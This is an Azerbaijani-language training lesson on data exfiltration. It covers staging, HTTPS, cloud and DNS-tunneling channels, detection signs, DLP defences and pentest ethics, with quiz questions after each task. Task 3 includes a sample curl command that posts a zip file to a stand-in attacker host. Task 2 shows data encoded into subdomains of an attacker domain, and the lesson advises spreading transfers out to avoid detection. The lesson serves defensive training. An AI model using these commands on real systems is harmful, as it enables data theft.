# Room: Data Exfiltration Əsasları

**Path:** Post-Exploitation & Advanced Red Team
**Module:** Post-Exploitation
**Çətinlik:** Intermediate
**Təxmini vaxt:** 1 saat

## Room haqqında

Hücumun "nəticəsi" — məlumatın sistemdən çıxarılmasıdır: sənədlər, bazalar, parollar, intellektual mülk. Bu room-da exfiltration-ın konseptual yollarını (DNS tunneling, HTTP exfil), aşkarlanma risklərini və müdafiə tərəfinin (DLP) baxışını öyrənəcəyik. Texnikalar konseptual səviyyədə — hədəf anlayışdır, alət təlimatı yox.

## Öyrənmə nəticələri

- Exfiltration kanallarını (HTTP/S, DNS, cloud) və onların məntiqini izah etmək
- DNS tunneling-in necə işlədiyini konseptual bilmək
- Hər kanalın aşkarlanma əlamətlərini sadalamaq
- DLP və müdafiə tədbirlərinin əsaslarını bilmək

## Task 1 — Exfiltration Nədir: Kanal Seçiminin Məntiqi

**Exfiltration** — məlumatın icazəsiz şəkildə sistemdən xaricə çıxarılması. Ssenarinin son addımıdır, amma ən "görünən" addım olma ehtimalı daşıyır — bütün hücum boyu gizlənən attacker burada "böyük hərəkət" edir.

Kanal seçiminin dörd amili (hücumçu baxımı):

1. **Həcm:** 2 KB parol siyahısı ilə 200 GB baza fərqli kanal tələb edir.
2. **Aşkarlanma:** firewall `unknown-IP-yə 200MB` görəndə siqnal qalxır; amma "HTTPS traffic normal sayt" — görmür.
3. **Mövcudluq:** şəbəkədə nə icazəlidir? (DNS hər yerdə açıqdır; SMTP bloklanmış ola bilər.)
4. **İz:** kanalın log-ları (proxy, DNS log-ları) nə qədər detalli saxlanılır?

Klassik kanalların xəritəsi:

| Kanal | Məntiq | Güclü/zəif tərəf |
|---|---|---|
| **HTTPS (ən çox)** | məlumatı cari şəbəkədən görünən leqal sayta/cloud-a göndərmək | şifrəli, "normal" görünür |
| **DNS tunneling** | DNS sorğularının içində data daşımaq | DNS demək olar hər yerdə açıqdır |
| **Cloud storage** | Drive/S3/dropbox API-yə upload | leqal domain-lər, yalnız həcm görünür |
| **Email/SMTP** | əlavə olaraq göndərmək | köhnə üsul, DLP tutur |
| **Fiziki/steganografiya** | USB, şəkil/səs içində gizlətmə | offline hədəflərdə |

**Staging mərhələsi** — exfil-dən əvvəl məlumatın toplanması: fayllar bir qovluqa yığılır (məs. `C:\Windows\Temp\...`), sıxılır (rar/7z — həcm azalır), bəzən şifrələnir (parol protected arxiv — DLP içini oxuya bilmir, ancaq adı görür). Pentest-də staging qovluğu aşkarlanması klassik tapıntıdır (IR prosesləri buna görə temp qovluqları izləyir).

Ən vacib praktik nüans: **real hücumlarda exfiltration adətən "böyük bir akt" yox, ağıllı dozalanan axın** — normal trafik arasına qarışdırılmış, uzun müddətə yayılmış transfer. "Gündə 50MB, 10 gün" — "bir gecədə 500MB"-dan az görünür.

**Sual 1**
Kanal seçiminin dörd amili hansılardır?

**Sual 2.**
Niyə HTTPS ən çox istifadə olunan kanaldır?

**Sual 3.**
Staging nə deməkdir və niyə aşkarlanır?

## Task 2 — DNS Tunneling: DNS-in "Poçt Xidməti" Rollu

DNS — şəbəkənin ən "etibarlı" servislərindən biridir: hər şey üçün istifadə olunur, demək olar heç vaxt tam bloklanmır. Bu, onu exfiltration üçün ideal gizli kanal edir.

**Mexanizm (konseptual):** DNS sorğusunda subdomain hissəsi sərbəstdir:

```
[aGVsbG8gd29ybGQ=].attacker-domain.com
      ↑ base64 ilə kodlanmış data
```

Hədəf sistem bu sorğunu öz DNS server-inə göndərir → recursive resolver → attacker-in nameserver-inə çatır → attacker subdomain-i dekodlayır → **data gəlib çatdı**. Cavabın TXT qeydləri ilə geri kanal da olur (komanda/gözləmə).

Addım-addım (prinsip):

1. Məlumat hissələrə bölünür (DNS sorğu limiti ~253 simvol) + base64/hex encode.
2. Hər hissə subdomain kimi sorğulunur: `part1.attacker.com`, `part2.attacker.com`...
3. Attacker-in DNS server-i bütün sorğuları qəbul edir, logdan məlumatı yığır.
4. (Opsional) TXT cavabları ilə hədəfə əmr/parametr qayıdır.

Xüsusiyyətlər: **yavaşdır** (həcm limiti), amma **çox gizlidir** (bəzi KB-lar, parollar, siqnal məlumatı üçün ideal); DNS protokolu şifrələnmədiyindən məlumat "açıq" gedir — amma kim subdomain-ləri oxuyub decode edəcək?

**Aşkarlanma əlamətləri** (müdafiə üçün):

- **Həcm anomaliyası:** bir host-un DNS sorğu sayı normadan yuxarı (müntəzəm client ~yüzlərlə/gün; tunnel — minlərlə).
- **Subdomain uzunluğu/entropiya:** `xn--` tipli, çox uzun, random subdomain-lər.
- **Nadir record tipləri:** TXT/CNAME anomaliyaları.
- **Tək hədəf domen:** bütün qəribə sorğular bir domain-ə.
- Passiv DNS analiz alətləri bu pattern-ləri tutur (müasir NDR/DNS security məhsulları).

Digər "etibarlı protokol" kanalları (eyni məntiq): ICMP ping payload (kiçik həcm), HTTPS-over-CDN, cloud metadata/IP. Hər birinə öz aşkarlanma imzası var — "hər kanalın öz qoxusu" prinsipi.

**Sual 1**
DNS tunneling-də data harada daşınır?

**Sual 2.**
Niyə DNS tunneling yavaş, amma gizlidir?

**Sual 3.**
DNS tunneling-in üç aşkarlanma əlaməti nədir?

## Task 3 — HTTP(S) Exfil və Aşkarlanma Qarşıdurması

**HTTP(S) exfiltration** — məlumatın web trafiki içində (POST body, upload, cookie, URL path) daşınması. Mümkün formalər:

- Sadə POST: `curl -X POST https://attacker.com/upload -d @data.zip` (aşkar — yalnız lab).
- **Leqal cloud istifadəsi:** faylı gerçek Dropbox/Drive/S3 hesabına yükləmək — trafik " Dropbox-a upload" kimi görünür; yalnız həcm/davranış anomalidir.
- **Leqal sayt istismalı:** pastebin/hesabat saytları, social media DM (hər hansı icazəli web "not drop" rolunda).
- Domain fronting (tarixi texnika): CDN-in arxasındakı həqiqi host-u gizlətmək — SNI/Host ayrılığı ilə trafik "leqal CDN" görünürdü (müasir CDN-lər bunu bağlayıb — konsept kimi qalır).

Müdafiə tərəfi bu kanalla necə mübarizə aparır:

1. **Proxy/SWG (Secure Web Gateway):** bütün HTTPS metadatasını görür (SNI, sertifikat, həcm) — məzmun şifrəli olsa da "hara, nə qədər" görünür.
2. **SSL inspeksiya (MITM proxy):** şifrəni açıb məzmunu skan edir (korporativ MITM sertifikatı ilə) — məxfilik/təhlükəsizlik traid-off.
3. **DLP (Data Loss Prevention):** məzmun analiz — credit kart pattern-i, məxfilik etiketləri (HPF/EPF), bilinən fayl hash-ləri, bazaların strukturu.
4. **UEBA/NDR:** istifadəçi davranış anomaliyası (bu istifadəçi heç vaxt 2GB upload etmirdi), şəbəkə axını anomaliyaları.

Bu qarşıdurmanın dərsi: **"şifrəli = görünməz" deyil** — həcm, istiqamət, vaxt, davranış metadatası hər kanalda qalır. Müasir müdafiə məzmun yox, **metadata anomalilərini** izləyir; hükomçu bunun üçün "yavaş-çox-normal" strategiya seçir.

**Sual 1**
Leqal cloud exfil nə üçün aşkarlanması çətindir?

**Sual 2.**
SSL inspeksiya nə edir və hansı traid-off daşıyır?

**Sual 3.**
"Metadata hər kanalda qalır" nə deməkdir?

## Task 4 — Müdafiə: DLP və Exfiltration Əleyhinə Arxitektura

Exfiltration müdafiəsi qat-qat qurulur (müasir təşkilatlarda):

**1. Kanal idarəetməsi (ağ siyahı modeli):** çıxış yalnız lazımi saytlara/icazəli kateqoriyalara; sosial media/storage upload məhdudiyyətləri; SMTP yalnız korporativ server-dən. "Default allow" deyil "default deny + icazələr".

**2. DLP məzmun analizləri:**

- Pattern əsaslı: kart nömrələri, TIN, parol pattern-ləri, məxfilik açar sözləri.
- Etiket əsaslı: sənədlərdəki classification etiketləri (Qeyri-şəxsi/Daxili/Məxfi) — etiketli fayl xaricə çıxa bilmir.
- Struktur əsaslı: bazanın çıxarılışının "sətir strukturu" tanınır (CSV dump pattern).
- Endpoint DLP: printer, USB, clipboard, ekran görüntüsü monitoringi (yalnız şəbəkə deyil).

**3. Şəbəkə monitorinqi:**

- DNS security (tunneling/domain reputation).
- NDR (Network Detection & Response): axın anomaliyaları, həcm spike-ları.
- Cloud access security broker (CASB): "hansı istifadəçi hansı cloud-a nə yükləyir" görünür.

**4. Data özünün qorunması (ən fundamental):**

- Şifrələmə-at-rest: oğurlanan fayl şifrəsiz açılmır (açarlar ayrı idarə olunur).
- Access idarəetməsi: "kim niyə bütün bazaya oxuyur?" — exfil üçün əvvəlcə oxumaq lazımdır; ümumi oxuma hüquqları hücumçuya xammal verir.
- Data minimizasiya: lazımsız məlumat saxlanmır — oğurlanacaq heç nə yoxdur.

Bu sonuncu qat ən dərin dərsdir: **exfiltration müdafiəsi exfiltration anında yox, məlumatın həyat dövründə qazanılır.** Həcmli məlumat hüququ mərkəzləşmiş, izlənən və minimal olan sistemdə "çıxarma" aktı özü anomaliya olur.

Pentest tərəfində baxış: exfiltration testi adətən "kanalın mövcudluğunu göstərmək"lə məhdudlaşır (məs. test faylını razılaşdırılmış "hədəfə" göndərmək, DLP-nin tutub-tutmadığını yoxlamaq) — real müştəri datasının çıxarılması qəti qadağandır. Bu, ROE-nün ən sərt bölmələrindən biridir.

**Sual 1**
"Default deny + icazələr" modeli nə deməkdir?

**Sual 2.**
Endpoint DLP şəbəkə DLP-dən nə ilə fərqlənir?

**Sual 3.**
"Niyə exfiltration müdafiəsi məlumatın həyat dövründə qazanılır?"

## Task 5 — Sintez və Module Yekunu

Post-exploitation module-unun (7.1) iki room-unu birləşdirək — tam ssenari məntiqi:

```
[Persistence]                     [Exfiltration]
qapılar qoyulur        →         hədəf məlumat:
cron/SSH/task/registry            staging (topla+sıx)
   ↓                              ↓
sistemdə qalmaq imkanı      kanal seçimi (HTTPS/DNS/cloud)
   ↓                              ↓
reboot/restart-dan sonra      dozalanan transfer
da hücum davam edir               ↓
                              data xaricdə
```

İki hissənin ortaq xarakteri: **hər ikisi "sakit" olmağa çalışır.** Persistence görünməz qalmalı, exfiltration normal görünməlidir. Bunun müqabilində müdafiə hər iki sahədə "baseline + anomaliya" modeli ilə işləyir: nəyin normal olduğunu bilmək, ondan kənarını siqnal etmək.

Etik konturun xatirlədilməsi (bu module xüsusən vacibdir):

- Lab mühitlərində (TryHackMe exfil room-ları, öz lab-ınız) texnikalar azad sınaq olunur.
- Real pentest-də: exfil yalnız sintetik test datası ilə, razılaşdırılmış "attacker" hədəfinə; persistence ROE ilə; hər qoyulan element hesabatda.
- Bu biliklərin müdafiə tərəfi (DLP konfiqurasiyası, DNS monitorinqi) üçün də eyni dərəcədə dəyəri var — hücum texnikasını bilmədən onu tutmaq mümkün deyil.

Path-7-nin qalanı: **7.2 C2** — bütün bu fəaliyyətləri (persistence, enum, lateral, exfil) mərkəzləşdirilmiş şəkildə idarə edən framework-lər; **7.3 Evasion** — bu fəaliyyətlərin AV/EDR gözlərindən yayınması. Bu room-da öyrənilən "kanal + gizlilik + aşkarlanma" üçlüyü hər ikisinin təməl bilik bazasıdır.

**Sual 1**
Persistence ilə exfiltration-in ortaq xarakteri nədir?

**Sual 2.**
Müdafiənin "baseline + anomaliya" modeli necə işləyir?

**Sual 3.**
Exfil bilikləri müdafiə üçün nə verir?
